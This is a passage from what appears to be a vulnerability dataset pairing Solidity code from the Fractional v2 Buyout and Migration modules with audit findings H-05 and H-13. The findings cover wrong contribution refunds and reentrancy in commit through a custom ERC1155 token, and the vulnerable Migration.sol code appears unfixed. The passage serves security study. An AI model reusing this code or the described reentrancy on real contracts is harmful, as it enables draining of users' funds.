auction is still active\n    error TimeNotElapsed(uint256 _current, uint256 _deadline);\n    /// @dev Emitted when ether deposit amount for starting a buyout is zero\n    error ZeroDeposit();\n\n    /// @dev Event log for starting a buyout\n    /// @param _vault Address of the vault\n    /// @param _proposer Address that created the buyout\n    /// @param _startTime Timestamp of when buyout was created\n    /// @param _buyoutPrice Price of buyout pool in ether\n    /// @param _fractionPrice Price of fractional tokens\n    event Start(\n        address indexed _vault,\n        address indexed _proposer,\n        uint256 _startTime,\n        uint256 _buyoutPrice,\n        uint256 _fractionPrice\n    );\n    /// @dev Event log for selling fractional tokens into the buyout pool\n    /// @param _seller Address selling fractions\n    /// @param _amount Transfer amount being sold\n    event SellFractions(address indexed _seller, uint256 _amount);\n    /// @dev Event log for buying fractional tokens from the buyout pool\n    /// @param _buyer Address buying fractions\n    /// @param _amount Transfer amount being bought\n    event BuyFractions(address indexed _buyer, uint256 _amount);\n    /// @dev Event log for ending an active buyout\n    /// @param _vault Address of the vault\n    /// @param _state Enum state of auction\n    /// @param _proposer Address that created the buyout\n    event End(address _vault, State _state, address indexed _proposer);\n    /// @dev Event log for cashing out ether for fractions from a successful buyout\n    /// @param _vault Address of the vault\n    /// @param _casher Address cashing out of buyout\n    /// @param _amount Transfer amount of ether\n    event Cash(address _vault, address indexed _casher, uint256 _amount);\n    /// @dev Event log for redeeming the underlying vault assets from an inactive buyout\n    /// @param _vault Address of the vault\n    /// @param _redeemer Address redeeming underlying assets\n    event Redeem(address _vault, address indexed _redeemer);\n\n    function PROPOSAL_PERIOD() external view returns (uint256);\n\n    function REJECTION_PERIOD() external view returns (uint256);\n\n    function batchWithdrawERC1155(\n        address _vault,\n        address _token,\n        address _to,\n        uint256[] memory _ids,\n        uint256[] memory _values,\n        bytes32[] memory _erc1155BatchTransferProof\n    ) external;\n\n    function buyFractions(address _vault, uint256 _amount) external payable;\n\n    function buyoutInfo(address)\n        external\n        view\n        returns (\n            uint256 startTime,\n            address proposer,\n            State state,\n            uint256 fractionPrice,\n            uint256 ethBalance,\n            uint256 lastTotalSupply\n        );\n\n    function cash(address _vault, bytes32[] memory _burnProof) external;\n\n    function end(address _vault, bytes32[] memory _burnProof) external;\n\n    function getLeafNodes() external view returns (bytes32[] memory nodes);\n\n    function getPermissions()\n        external\n        view\n        returns (Permission[] memory permissions);\n\n    function redeem(address _vault, bytes32[] memory _burnProof) external;\n\n    function registry() external view returns (address);\n\n    function sellFractions(address _vault, uint256 _amount) external;\n\n    function start(address _vault) external payable;\n\n    function supply() external view returns (address);\n\n    function transfer() external view returns (address);\n\n    function withdrawERC20(\n        address _vault,\n        address _token,\n        address _to,\n        uint256 _value,\n        bytes32[] memory _erc20TransferProof\n    ) external;\n\n    function withdrawERC721(\n        address _vault,\n        address _token,\n        address _to,\n        uint256 _tokenId,\n        bytes32[] memory _erc721TransferProof\n    ) external;\n\n    function withdrawERC1155(\n        address _vault,\n        address _token,\n        address _to,\n        uint256 _id,\n        uint256 _value,\n        bytes32[] memory _erc1155TransferProof\n    ) external;\n}\n\n\n// SPDX-License-Identifier: MIT\npragma solidity 0.8.13;\n\nimport {Permission} from \"./IVaultRegistry.sol\";\nimport {State} from \"./IBuyout.sol\";\n\n/// @dev Struct of migration proposal info for a vault\nstruct Proposal {\n    // Start time of the migration proposal\n    uint256 startTime;\n    // Target buyout price for the migration\n    uint256 targetPrice;\n    // Total ether contributed to the migration\n    uint256 totalEth;\n    // Total fractions contributed to the migration\n    uint256 totalFractions;\n    // Module contract addresses proposed for the migration\n    address[] modules;\n    // Plugin contract addresses proposed for the migration\n    address[] plugins;\n    // Function selectors for the proposed plugins\n    bytes4[] selectors;\n    // Address for the new vault to migrate to (if buyout is succesful)\n    address newVault;\n    // Boolean status to check if the propoal is active\n    bool isCommited;\n    // Old fraction supply for a given vault\n    uint256 oldFractionSupply;\n    // New fraction supply for a given vault that has succesfully migrated\n    uint256 newFractionSupply;\n    // Boolean status to check that the fractions have already been migrated\n    bool fractionsMigrated;\n}\n\n/// @dev Interface for Migration module contract\ninterface IMigration {\n    /// @dev Emitted when someone attempts to mint more new fractions into existence\n    error NewFractionsAlreadyMinted();\n    /// @dev Emitted when someone attempts to deploy a vault after a migration has already redeployed one\n    error NewVaultAlreadyDeployed(address _newVault);\n    /// @dev Emitted when a user attempts to withdraw non existing contributions\n    error NoContributionToWithdraw();\n    /// @dev Emitted when the buyout was not initiated by a migration\n    error NotProposalBuyout();\n    /// @dev Emitted when an action is taken on a proposal id that does not exist\n    error NotProposed();\n    /// @dev Emitted when the address is not a registered vault\n    error NotVault(address _vault);\n    /// @dev Emitted when a user attempts to settle an action before a new vault has been deployed\n    error NoVaultToMigrateTo();\n    /// @dev Emitted when an action is taken on a migration with a proposal period that has ended\n    error ProposalOver();\n    /// @dev Emitted when a migration is attempted after an unsuccessful buyout\n    error UnsuccessfulMigration();\n\n    /// @dev Event log for minting the new fractional supply for a vault\n    /// @param _oldVault Address of the old vault\n    /// @param _newVault Address of the new vault\n    /// @param _proposalId id of the proposal\n    /// @param _amount Amount of fractions settled\n    event FractionsMigrated(\n        address indexed _oldVault,\n        address indexed _newVault,\n        uint256 _proposalId,\n        uint256 _amount\n    );\n    /// @dev Event log for settling a vault\n    /// @param _oldVault Address of the old vault\n    /// @param _newVault Address of the vault\n    /// @param _proposalId id of the proposal for the Migration\n    /// @param _modules Addresses of module contracts\n    /// @param _plugins Addresses of plugin contracts\n    /// @param _selectors List of plugin function selectors\n    event VaultMigrated(\n        address indexed _oldVault,\n        address indexed _newVault,\n        uint256 _proposalId,\n        address[] _modules,\n        address[] _plugins,\n        bytes4[] _selectors\n    );\n\n    function PROPOSAL_PERIOD() external view returns (uint256);\n\n    function batchMigrateVaultERC1155(\n        address _vault,\n        uint256 _proposalId,\n        address _nft,\n        uint256[] memory _ids,\n        uint256[] memory _amounts,\n        bytes32[] memory _erc1155BatchTransferProof\n    ) external;\n\n    function buyout() external view returns (address payable);\n\n    function commit(address _vault, uint256 _proposalId)\n        external\n        returns (bool started);\n\n    function generateMerkleTree(address[] memory _modules)\n        external\n        view\n        returns (bytes32[] memory hashes);\n\n    function join(\n        address _vault,\n        uint256 _proposalId,\n        uint256 _amount\n    ) external payable;\n\n    function leave(address _vault, uint256 _proposalId) external;\n\n    function migrateFractions(address _vault, uint256 _proposalId) external;\n\n    function migrateVaultERC20(\n        address _vault,\n        uint256 _proposalId,\n        address _token,\n        uint256 _amount,\n        bytes32[] memory _erc20TransferProof\n    ) external;\n\n    function migrateVaultERC721(\n        address _vault,\n        uint256 _proposalId,\n        address _nft,\n        uint256 _tokenId,\n        bytes32[] memory _erc721TransferProof\n    ) external;\n\n    function migrationInfo(address, uint256)\n        external\n        view\n        returns (\n            uint256 startTime,\n            uint256 targetPrice,\n            uint256 totalEth,\n            uint256 totalFractions,\n            address newVault,\n            bool isCommited,\n            uint256 oldFractionSupply,\n            uint256 newFractionSupply,\n            bool fractionsMigrated\n        );\n\n    function nextId() external view returns (uint256);\n\n    function propose(\n        address _vault,\n        address[] memory _modules,\n        address[] memory _plugins,\n        bytes4[] memory _selectors,\n        uint256 _newFractionSupply,\n        uint256 _targetPrice\n    ) external;\n\n    function registry() external view returns (address);\n\n    function settleFractions(\n        address _vault,\n        uint256 _proposalId,\n        bytes32[] memory _mintProof\n    ) external;\n\n    function settleVault(address _vault, uint256 _proposalId) external;\n\n    function withdrawContribution(address _vault, uint256 _proposalId) external;\n}\n\n\n",
        "CodeNames": [
            "IBuyout.sol",
            "IMigration.sol"
        ],
        "VulnerabilityDesc": [
            {
                "Name": "H-05",
                "Location": [
                    "withdrawContribution",
                    "buyFractions"
                ],
                "Type": " Migration::withdrawContribution falsely assumes that user should get exactly his original contribution back",
                "Description": "\n<https://github.com/code-423n4/2022-07-fractional/blob/main/src/modules/Migration.sol#L308\n\n<https://github.com/code-423n4/2022-07-fractional/blob/main/src/modules/Migration.sol#L321\n\n<https://github.com/code-423n4/2022-07-fractional/blob/main/src/modules/Migration.sol#L312\n\n<https://github.com/code-423n4/2022-07-fractional/blob/main/src/modules/Migration.sol#L325\n\n\nWhen a user calls withdrawContribution, it will try to send him back his original contribution for the proposal.\n\nBut if the proposal has been committed, and other users have interacted with the buyout, Migration will receive back a different amount of ETH and tokens.\n\nTherefore it shouldn't send the user back his original contribution, but should send whatever his share is of whatever was received back from Buyout.\n\n\nLoss of funds for users.\nSome users might not be able to withdraw their contribution at all,\nand other users might withdraw funds that belong to other users. (This can also be done as a purposeful attack.)\n\n\nA summary is described at the top.\n\nIt's probably not needed, but here's the flow in detail.\nWhen a user joins a proposal, Migration saves(https://github.com/code-423n4/2022-07-fractional/blob/main/src/modules/Migration.sol#L124:#L135) his contribution:\n\n            userProposalEth[_proposalId][msg.sender] += msg.value;\n            userProposalFractions[_proposalId][msg.sender] += _amount;\n\nLater when the user would want to withdraw his contribution from a failed migration, Migration would refer(https://github.com/code-423n4/2022-07-fractional/blob/main/src/modules/Migration.sol#L308:#L325) to these same variables to decide how much to send to the user:\n\n            uint256 userFractions = userProposalFractions[_proposalId][msg.sender];\n            IFERC1155(token).safeTransferFrom(address(this), msg.sender, id, userFractions, \"\");\n            uint256 userEth = userProposalEth[_proposalId][msg.sender];\n            payable(msg.sender).transfer(userEth);\n\nBut if the proposal was committed, and other users interacted with the buyout, then the amount of ETH and tokens that Buyout sends back is not the same contribution.\n\nFor example, if another user called buyFractions for the buyout, it will decrease(https://github.com/code-423n4/2022-07-fractional/blob/main/src/modules/Buyout.sol#L168) the amount of tokens in the pool:\n\n            IERC1155(token).safeTransferFrom(address(this), msg.sender, id, _amount, \"\");\n\nAnd when the proposal will end, if it has failed, Buyout will send back(https://github.com/code-423n4/2022-07-fractional/blob/main/src/modules/Buyout.sol#L228) to Migration the amount(https://github.com/code-423n4/2022-07-fractional/blob/main/src/modules/Buyout.sol#L206) of tokens in the pool:\n\n            uint256 tokenBalance = IERC1155(token).balanceOf(address(this), id);\n            ...\n            IERC1155(token).safeTransferFrom(address(this), proposer, id, tokenBalance, \"\");\n\n(**Same will happen for the ETH amount)\n\nTherefore, Migration will receive back less tokens than the original contribution.\nWhen the user will try to call withdrawContribution to withdraw his contribution from the pool, Migration would try to send(https://github.com/code-423n4/2022-07-fractional/blob/main/src/modules/Migration.sol#L310) the user's original contribution.\nBut there's a deficit of that.\nIf other users have contributed the same token, then it will transfer their tokens to the user.\nIf not, then the withdrawal will simply revert for insufficient balance.\n\n",
                "Repair": "\nI am not sure, but I think that the correct solution would be that upon a failed proposal's end, there should be a hook call from Buyout to the proposer in our situation, Migration.\nMigration would then see(/receive as parameter) how much ETH/tokens were received, and update the proposal with the change needed. eg. send to each user 0.5 his tokens and 1.5 his ETH.\n\nIn another issue I submitted, \"User can't withdraw assets from failed migration if another buyout is going on/succeeded\", I described for a different reason why such a callback to Migration might be needed. Please see there for more implementation suggestions.\n\nI think this issue shows that indeed it is needed.\n\nstevennevins (Fractional) confirmed(https://github.com/code-423n4/2022-07-fractional-findings/issues/375) \n\nHardlyDifficult (judge) commented(https://github.com/code-423n4/2022-07-fractional-findings/issues/375#issuecomment-1201863053):\n  After an unsuccessful migration, some users will be unable to recover their funds due to a deficit in the contract. Agree this is a High risk issue.\n\n\n\n*\n\n\n"
            },
            {
                "Name": "H-13",
                "Location": [
                    "//solidity\n// modules/Migration.sol::commit\n// proposal.isCommited and started are set after the out going calls (i.e. start, setApprovalFor)\n// Mitigation idea: set the values before the out going calls\n\n206         if (currentPrice  proposal.targetPrice) {\n207             // Sets token approval to the buyout contract\n208             IFERC1155(token).setApprovalFor(address(buyout), id, true);\n209             // Starts the buyout process\n210             IBuyout(buyout).start{value: proposal.totalEth}(_vault);\n211             proposal.isCommited = true;\n212             started = true;\n213         }\n"
                ],
                "Type": " Migration Module: Re-enter  commit  using custom token",
                "Description": "\nHIGH Assets can be compromised directly.\n\nOne can drain eth out from migration module to buyout module using custom made FERC1155 token.\n\n\n*   Proof of Concept: testCommitReenter_poc(https://gist.github.com/zzzitron/24c02e069b428f7a95ebc6c931e29b4e#file-2022-07-fractionalv2-poc-modules-t-sol-L283-L339)\n*   Custom made FERC1155 for the attack(https://gist.github.com/zzzitron/24c02e069b428f7a95ebc6c931e29b4e#file-2022-07-fractionalv2-poc-modules-t-sol-L6-L63)\n\nThe proof of concept shows a scenario where Alice is draining migration module using custom made FERC1155 token.\n\n1.  Setup: other people are using migration module and they deposited some eth. (using Alice and Bob just to simplify the set up process)\n2.  Alice prepared the custom FERC1155 (let's say evil_token)\n3.  Alice create a vault with the evil_token\n4.  Alice proposes and joins with 0.5 ether\n5.  When Alice calls commit, the evil_token will reenter commit and send money to buyout module\n\nNote: For simplicity, the evil_token reenters for a fixed number of times. But one can adjust to drain all the eth in the migration module.\nNote2: For now the eth is in the buyout module, but given the current implementation of buyout module, the same actor can drain eth from buyout.\n\nThe commit function is not written in Checks, Effects, Interactions (CEI) patterns.\n\nsolidity\n// modules/Migration.sol::commit\n// proposal.isCommited and started are set after the out going calls (i.e. start, setApprovalFor)\n// Mitigation idea: set the values before the out going calls\n\n206         if (currentPrice  proposal.targetPrice) {\n207             // Sets token approval to the buyout contract\n208             IFERC1155(token).setApprovalFor(address(buyout), id, true);\n209             // Starts the buyout process\n210             IBuyout(buyout).start{value: proposal.totalEth}(_vault);\n211             proposal.isCommited = true;\n212             started = true;\n213         }\n\n\n\nFoundry\n\n",
                "Repair": "\nFollow Checks, Effects, Interactions patterns. One can also consider adding reentrancy guard.\n\nstevennevins (Fractional) confirmed(https://github.com/code-423n4/2022-07-fractional-findings/issues/576)\n\nHardlyDifficult (judge) commented(https://github.com/code-423n4/2022-07-fractional-findings/issues/576#issuecomment-1212198774):\n  The 1155 callback could be used to reentrancy and steal funds. Agree this is high risk.\n\n\n\n*\n\n\n"
            }
        ]
    },
    {
        "Code": "// SPDX-License-Identifier: Unlicense\npragma solidity 0.8.13;\n\nimport {IBuyout, Auction, State} from \"../interfaces/IBuyout.sol\";\nimport {IERC20} from \"../interfaces/IERC20.sol\";\nimport {IERC721} from \"../interfaces/IERC721.sol\";\nimport {IERC1155} from \"../interfaces/IERC1155.sol\";\nimport {IFERC1155} from \"../interfaces/IFERC1155.sol\";\nimport {IMigration, Proposal} from \"../interfaces/IMigration.sol\";\nimport {IModule} from \"../interfaces/IModule.sol\";\nimport {IVault} from \"../interfaces/IVault.sol\";\nimport {IVaultRegistry, Permission} from \"../interfaces/IVaultRegistry.sol\";\nimport {MerkleBase} from \"../utils/MerkleBase.sol\";\nimport {Minter} from \"./Minter.sol\";\nimport {Multicall} from \"../utils/Multicall.sol\";\nimport {NFTReceiver} from \"../utils/NFTReceiver.sol\";\nimport {ReentrancyGuard} from \"@rari-capital/solmate/src/utils/ReentrancyGuard.sol\";\n\n/// @title Migration\n/// @author Fractional Art\n/// @notice Module contract for vaults to migrate to a new set of permissions\n/// - A fractional holder creates a proposal with a target price and list of modules\n/// - For 7 days, users can contribute their fractions / ether to signal support\n/// - If the target price is reached then a buyout can be triggered and trading\n///   against the proposed buyout price can take place to resolve the outcome\n/// - If a proposal holds more than 51% of the total supply, the buyout succeeds, a new vault can\n///   be created and the underlying assets (ERC-20, ERC-721 and ERC-1155 tokens) can be migrated\ncontract Migration is\n    IMigration,\n    MerkleBase,\n    Minter,\n    Multicall,\n    NFTReceiver,\n    ReentrancyGuard\n{\n    /// @notice Address of Buyout module contract\n    address payable public buyout;\n    /// @notice Address of VaultRegistry contract\n    address public registry;\n    /// @notice Counter used to assign IDs to new proposals\n    uint256 public nextId;\n    /// @notice The length for the migration proposal period\n    uint256 public constant PROPOSAL_PERIOD = 7 days;\n    /// @notice Mapping of a vault to it's proposal migration information\n    mapping(address => mapping(uint256 => Proposal)) public migrationInfo;\n    /// @notice Mapping of a proposal ID to a user's ether contribution\n    mapping(uint256 => mapping(address => uint256)) private userProposalEth;\n    /// @notice Mapping of a proposal ID to a user's fractions contribution\n    mapping(uint256 => mapping(address => uint256))\n        private userProposalFractions;\n\n    /// @notice Initializes buyout, registry, and supply contracts\n    constructor(\n        address _buyout,\n        address _registry,\n        address _supply\n    ) Minter(_supply) {\n        buyout = payable(_buyout);\n        registry = _registry;\n    }\n\n    /// @dev Callback for receiving ether when the calldata is empty\n    receive() external payable {}\n\n    /// @notice Proposes a set of modules and plugins to migrate a vault to\n    /// @param _vault Address of the vault\n    /// @param _modules Addresses of module contracts\n    /// @param _plugins Addresses of plugin contracts\n    /// @param _selectors List of plugin function selectors\n    /// @param _newFractionSupply New supply of fractional tokens\n    /// @param _targetPrice Target price of the buyout\n    function propose(\n        address _vault,\n        address[] calldata _modules,\n        address[] calldata _plugins,\n        bytes4[] calldata _selectors,\n        uint256 _newFractionSupply,\n        uint256 _targetPrice\n    ) external {\n        // Reverts if address is not a registered vault\n        (, uint256 id) = IVaultRegistry(registry).vaultToToken(_vault);\n        if (id == 0) revert NotVault(_vault);\n        // Reverts if buyout state is not inactive\n        (, , State current, , , ) = IBuyout(buyout).buyoutInfo(_vault);\n        State required = State.INACTIVE;\n        if (current != required) revert IBuyout.InvalidState(required, current);\n\n        // Initializes migration proposal info\n        Proposal storage proposal = migrationInfo[_vault][++nextId];\n        proposal.startTime = block.timestamp;\n        proposal.targetPrice = _targetPrice;\n        proposal.modules = _modules;\n        proposal.plugins = _plugins;\n        proposal.selectors = _selectors;\n        proposal.oldFractionSupply = IVaultRegistry(registry).totalSupply(\n            _vault\n        );\n        proposal.newFractionSupply = _newFractionSupply;\n    }\n\n    /// @notice Joins a migration proposal by contributing ether and fractional tokens\n    /// @param _vault The address of the vault\n    /// @param _proposalId ID of the proposal being contributed to\n    /// @param _amount Number of fractions being contributed\n    function join(\n        address _vault,\n        uint256 _proposalId,\n        uint256 _amount\n    ) external payable nonReentrant {\n        // Reverts if address is not a registered vault\n        (address token, uint256 id) = IVaultRegistry(registry).vaultToToken(\n            _vault\n        );\n        if (id == 0) revert NotVault(_vault);\n        // Reverts if buyout state is not inactive\n        (, , State current, , , ) = IBuyout(buyout).buyoutInfo(_vault);\n        State required = State.INACTIVE;\n        if (current != required) revert IBuyout.InvalidState(required, current);\n\n        // Gets the migration proposal for the given ID\n        Proposal storage proposal = migrationInfo[_vault][_proposalId];\n        // Updates ether balances of the proposal and caller\n        proposal.totalEth += msg.value;\n        userProposalEth[_proposalId][msg.sender] += msg.value;\n        // Deposits fractional tokens into contract\n        IFERC1155(token).safeTransferFrom(\n            msg.sender,\n            address(this),\n            id,\n            _amount,\n            \"\"\n        );\n        // Updates fraction balances of the proposal and caller\n        proposal.totalFractions += _amount;\n        userProposalFractions[_proposalId][msg.sender] += _amount;\n    }\n\n    /// @notice Leaves a proposed migration with contribution amount\n    /// @param _vault Address of the vault\n    /// @param _proposalId ID of the proposal being left\n    function leave(address _vault, uint256 _proposalId) external {\n        // Reverts if address is not a registered vault\n        (address token, uint256 id) = IVaultRegistry(registry).vaultToToken(\n            _vault\n        );\n        if (id == 0) revert NotVault(_vault);\n        // Reverts if buyout state is not inactive\n        (, , State current, , , ) = IBuyout(buyout).buyoutInfo(_vault);\n        State required = State.INACTIVE;\n        if (current != required) revert IBuyout.InvalidState(required, current);\n\n        // Gets the migration proposal for the given ID\n        Proposal storage proposal = migrationInfo[_vault][_proposalId];\n        // Updates fraction balances of the proposal and caller\n        uint256 amount = userProposalFractions[_proposalId][msg.sender];\n        proposal.totalFractions -= amount;\n        userProposalFractions[_proposalId][msg.sender] = 0;\n        // Updates ether balances of the proposal and caller\n        uint256 ethAmount = userProposalEth[_proposalId][msg.sender];\n        proposal.totalEth -= ethAmount;\n        userProposalEth[_proposalId][msg.sender] = 0;\n\n        // Withdraws fractions from contract back to caller\n        IFERC1155(token).safeTransferFrom(\n            address(this),\n            msg.sender,\n            id,\n            amount,\n            \"\"\n        );\n        // Withdraws ether from contract back to caller\n        payable(msg.sender).transfer(ethAmount);\n    }\n\n    /// @notice Kicks off the buyout process for a migration\n    /// @param _vault Address of the vault\n    /// @param _proposalId ID of the proposal being committed to\n    /// @return started Bool status of starting the buyout process\n    function commit(address _vault, uint256 _proposalId)\n        external\n        returns (bool started)\n    {\n        // Reverts if address is not a registered vault\n        (address token, uint256 id) = IVaultRegistry(registry).vaultToToken(\n            _vault\n        );\n        if (id == 0) revert NotVault(_vault);\n        // Reverts if buyout state is not inactive\n        (, , State current, , , ) = IBuyout(buyout).buyoutInfo(_vault);\n        State required = State.INACTIVE;\n        if (current != required) revert IBuyout.InvalidState(required, current);\n        // Reverts if migration is passed proposal period\n        Proposal storage proposal = migrationInfo[_vault][_proposalId];\n        if (block.timestamp > proposal.startTime + PROPOSAL_PERIOD)\n            revert ProposalOver();\n\n        // Calculates current price of the proposal based on total supply\n        uint256 currentPrice = _calculateTotal(\n            100,\n            IVaultRegistry(registry).totalSupply(_vault),\n            proposal.totalEth,\n            proposal.totalFractions\n        );\n\n        // Checks if the current price is greater than target price of the proposal\n        if (currentPrice > proposal.targetPrice) {\n            // Sets token approval to the buyout contract\n            IFERC1155(token).setApprovalFor(address(buyout), id, true);\n            // Starts the buyout process\n            IBuyout(buyout).start{value: proposal.totalEth}(_vault);\n            proposal.isCommited = true;\n            started = true;\n        }\n    }\n\n    /// @notice Settles a migration by ending the buyout\n    /// @dev Succeeds if buyout goes through, fails otherwise\n    /// @param _vault Address of the vault\n    /// @param _proposalId ID of the proposal being settled\n    function settleVault(address _vault, uint256 _proposalId) external {\n        // Reverts if the migration was not proposed\n        Proposal storage proposal = migrationInfo[_vault][_proposalId];\n        if (!(proposal.isCommited)) revert NotProposed();\n        // Reverts if the migration was unsuccessful\n        (, , State current, , , ) = IBuyout(buyout).buyoutInfo(_vault);\n        if (current != State.SUCCESS) revert UnsuccessfulMigration();\n        // Reverts if the new vault has already been deployed\n        if (proposal.newVault != address(0))\n            revert NewVaultAlreadyDeployed(proposal.newVault);\n\n        // Gets the merkle root for the vault and given proposal ID\n        bytes32[] memory merkleTree = generateMerkleTree(proposal.modules);\n        bytes32 merkleRoot = getRoot(merkleTree);\n        // Deploys a new vault with set permissions and plugins\n        address newVault = IVaultRegistry(registry).create(\n            merkleRoot,\n            proposal.plugins,\n            proposal.selectors\n        );\n        // Sets address of the newly deployed vault\n        proposal.newVault = newVault;\n        // Emits event for settling the new vault\n        emit VaultMigrated(\n            _vault,\n            newVault,\n            _proposalId,\n            proposal.modules,\n            proposal.plugins,\n            proposal.selectors\n        );\n    }\n\n    /// @notice Mints the fractional tokens for a new vault\n    /// @param _vault Address of the vault\n    /// @param _proposalId ID of the proposal\n    /// @param _mintProof Merkle proof for minting fractional tokens\n    function settleFractions(\n        address _vault,\n        uint256 _proposalId,\n        bytes32[] calldata _mintProof\n    ) external {\n        // Reverts if the migration was unsuccessful\n        (, , State current, , , ) = IBuyout(buyout).buyoutInfo(_vault);\n        if (current != State.SUCCESS) revert UnsuccessfulMigration();\n        // Reverts if there is no new vault to migrate to\n        Proposal storage proposal = migrationInfo[_vault][_proposalId];\n        if (proposal.newVault == address(0)) revert NoVaultToMigrateTo();\n        // Reverts if fractions of the new vault have already been minted\n        if (proposal.fractionsMigrated) revert NewFractionsAlreadyMinted();\n\n        // Mints initial supply of fractions for the new vault\n        _mintFractions(\n            proposal.newVault,\n            address(this),\n            proposal.newFractionSupply,\n            _mintProof\n        );\n\n        migrationInfo[_vault][_proposalId].fractionsMigrated = true;\n        // Emits event for minting fractional tokens for the new vault\n        emit FractionsMigrated(\n            _vault,\n            proposal.newVault,\n            _proposalId,\n            proposal.newFractionSupply\n        );\n    }\n\n    /// @notice Retrieves ether and fractions deposited from an unsuccessful migration\n    /// @param _vault Address of the vault\n    /// @param _proposalId ID of the failed proposal\n    function withdrawContribution(address _vault, uint256 _proposalId)\n        external\n    {\n        // Reverts if address is not a registered vault\n        (address token, uint256 id) = IVaultRegistry(registry).vaultToToken(\n            _vault\n        );\n        if (id == 0) revert NotVault(_vault);\n        // Reverts if caller has no fractional balance to withdraw\n        (, , State current, , , ) = IBuyout(buyout).buyoutInfo(_vault);\n        if (\n            current != State.INACTIVE ||\n            migrationInfo[_vault][_proposalId].newVault != address(0)\n        ) revert NoContributionToWithdraw();\n\n        // Temporarily store user's fractions for the transfer\n        uint256 userFractions = userProposalFractions[_proposalId][msg.sender];\n        // Updates fractional balance of caller\n        userProposalFractions[_proposalId][msg.sender] = 0;\n        // Withdraws fractional tokens from contract back to caller\n        IFERC1155(token).safeTransferFrom(\n            address(this),\n            msg.sender,\n            id,\n            userFractions,\n            \"\"\n        );\n\n        // Temporarily store user's eth for the transfer\n        uint256 userEth = userProposalEth[_proposalId][msg.sender];\n        // Udpates ether balance of caller\n        userProposalEth[_proposalId][msg.sender] = 0;\n        // Withdraws ether from contract back to caller\n        payable(msg.sender).transfer(userEth);\n    }\n\n    /// @notice Migrates an ERC-20 token to the new vault after a successful migration\n    /// @param _vault Address of the vault\n    /// @param _proposalId ID of the proposal\n    /// @param _token Address of the ERC-20 token\n    /// @param _amount Transfer amount\n    /// @param _erc20TransferProof Merkle proof for transferring an ERC-20 token\n    function migrateVaultERC20(\n        address _vault,\n        uint256 _proposalId,\n        address _token,\n        uint256 _amount,\n        bytes32[] calldata _erc20TransferProof\n    ) external {\n        address newVault = migrationInfo[_vault][_proposalId].newVault;\n        // Withdraws an ERC-20 token from the old vault and transfers to the new vault\n        IBuyout(buyout).withdrawERC20(\n            _vault,\n            _token,\n            newVault,\n            _amount,\n            _erc20TransferProof\n        );\n    }\n\n    /// @notice Migrates an ERC-721 token to the new vault after a successful migration\n    /// @param _vault Address of the vault\n    /// @param _proposalId ID of the proposal\n    /// @param _token Address of the ERC-721 token\n    /// @param _tokenId ID of the token\n    /// @param _erc721TransferProof Merkle proof for transferring an ERC-721 token\n    function migrateVaultERC721(\n        address _vault,\n        uint256 _proposalId,\n        address _token,\n        uint256 _tokenId,\n        bytes32[] calldata _erc721TransferProof\n    ) external {\n        address newVault = migrationInfo[_vault][_proposalId].newVault;\n        // Withdraws an ERC-721 token from the old vault and transfers to the new vault\n        IBuyout(buyout).withdrawERC721(\n            _vault,\n            _token,\n            newVault,\n            _tokenId,\n            _erc721TransferProof\n        );\n    }\n\n    /// @notice Migrates an ERC-1155 token to the new vault after a successful migration\n    /// @param _vault Address of the vault\n    /// @param _proposalId ID of the proposal\n    /// @param _token Address of the ERC-1155 token\n    /// @param _id ID of the token\n    /// @param _amount amount to be transferred\n    /// @param _erc1155TransferProof Merkle proof for transferring an ERC-1155 token\n    function migrateVaultERC1155(\n        address _vault,\n        uint256 _proposalId,\n        address _token,\n        uint256 _id,\n        uint256 _amount,\n        bytes32[] calldata _erc1155TransferProof\n    ) external {\n        address newVault = migrationInfo[_vault][_proposalId].newVault;\n        // Withdraws an ERC-1155 token from the old vault and transfers to the new vault\n        IBuyout(buyout).withdrawERC1155(\n            _vault,\n            _token,\n            newVault,\n            _id,\n            _amount,\n            _erc1155TransferProof\n        );\n    }\n\n    /// @notice Batch migrates multiple ERC-1155 tokens to the new vault after a successful migration\n    /// @param _vault Address of the vault\n    /// @param _proposalId ID of the proposal\n    /// @param _token Address of the ERC-1155 token\n    /// @param _ids IDs of each token type\n    /// @param _amounts Transfer amounts per token type\n    /// @param _erc1155BatchTransferProof Merkle proof for batch transferring multiple ERC-1155 tokens\n    function batchMigrateVaultERC1155(\n        address _vault,\n        uint256 _proposalId,\n        address _token,\n        uint256[] calldata _ids,\n        uint256[] calldata _amounts,\n        bytes32[] calldata _erc1155BatchTransferProof\n    ) external {\n        address newVault = migrationInfo[_vault][_proposalId].newVault;\n        // Batch withdraws multiple ERC-1155 tokens from the old vault and transfers to the new vault\n        IBuyout(buyout).batchWithdrawERC1155(\n            _vault,\n            _token,\n            newVault,\n            _ids,\n            _amounts,\n            _erc1155BatchTransferProof\n        );\n    }\n\n    /// @notice Migrates the caller's fractions from an old vault to a new one after a successful migration\n    /// @param _vault Address of the vault\n    /// @param _proposalId ID of the proposal\n    function migrateFractions(address _vault, uint256 _proposalId) external {\n        // Reverts if address is not a registered vault\n        (, uint256 id) = IVaultRegistry(registry).vaultToToken(_vault);\n        if (id == 0) revert NotVault(_vault);\n        // Reverts if buyout state is not successful\n        (, address proposer, State current, , , ) = IBuyout(buyout).buyoutInfo(\n            _vault\n        );\n        State required = State.SUCCESS;\n        if (current != required) revert IBuyout.InvalidState(required, current);\n        // Reverts if proposer of buyout is not this contract\n        if (proposer != address(this)) revert NotProposalBuyout();\n\n        // Gets the last total supply of fractions for the vault\n        (, , , , , uint256 lastTotalSupply) = IBuyout(buyout).buyoutInfo(\n            _vault\n        );\n        // Calculates the total ether amount of a successful proposal\n        uint256 totalInEth = _calculateTotal(\n            1 ether,\n            lastTotalSupply,\n            migrationInfo[_vault][_proposalId].totalEth,\n            migrationInfo[_vault][_proposalId].totalFractions\n        );\n        // Calculates balance of caller based on ether contribution\n        uint256 balanceContributedInEth = _calculateContribution(\n            totalInEth,\n            lastTotalSupply,\n            userProposalEth[_proposalId][msg.sender],\n            userProposalFractions[_proposalId][msg.sender]\n        );\n\n        // Gets the token and fraction ID of the new vault\n        address newVault = migrationInfo[_vault][_proposalId].newVault;\n        (address token, uint256 newFractionId) = IVaultRegistry(registry)\n            .vaultToToken(newVault);\n        // Calculates share amount of fractions for the new vault based on the new total supply\n        uint256 newTotalSupply = IVaultRegistry(registry).totalSupply(newVault);\n        uint256 shareAmount = (balanceContributedInEth * newTotalSupply) /\n            totalInEth;\n\n        // Transfers fractional tokens to caller based on share amount\n        IFERC1155(token).safeTransferFrom(\n            address(this),\n            msg.sender,\n            newFractionId,\n            shareAmount,\n            \"\"\n        );\n    }\n\n    /// @notice Generates the merkle tree of a given proposal\n    /// @param _modules 